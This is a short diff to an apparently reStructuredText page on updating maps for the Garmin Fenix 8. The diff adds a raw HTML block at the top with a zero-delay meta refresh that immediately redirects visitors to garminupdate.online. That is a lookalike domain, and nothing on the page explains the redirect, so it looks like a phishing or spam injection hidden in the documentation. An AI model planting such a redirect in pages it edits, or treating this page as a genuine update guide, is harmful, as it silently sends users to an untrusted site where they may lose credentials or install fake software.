@@ -1,3 +1,9 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
+
+
 Garmin Fenix 8 Map Update: How to Get the Latest Maps & Navigation Features
 =============================================================
 
